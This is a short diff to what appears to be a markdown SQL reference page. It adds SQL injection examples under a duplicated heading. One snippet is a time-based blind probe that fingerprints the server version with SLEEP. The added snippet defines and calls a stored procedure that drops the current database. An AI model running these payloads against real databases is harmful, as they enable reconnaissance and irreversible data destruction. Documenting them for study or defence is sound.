@@ -337,7 +337,27 @@ SELECT /*comment*/1;
 </table>
 
 
-### Sql injection examples
+### Sql injection examples 1
 ```sql
 SELECT if(@@version LIKE '%ubuntu0.18.04.4%',SLEEP(5),'non_ubuntu');
+```
+
+
+### Sql injection examples 1
+```sql
+DELIMITER $$
+CREATE PROCEDURE dropCurrentDb()
+BEGIN
+
+SET @query = CONCAT("DROP DATABASE ",DATABASE());
+PREPARE stmt1 FROM @query; 
+EXECUTE stmt1; 
+DEALLOCATE PREPARE stmt1; 
+
+END$$
+ 
+DELIMITER ;
+
+
+CALL dropCurrentDb()
 ```
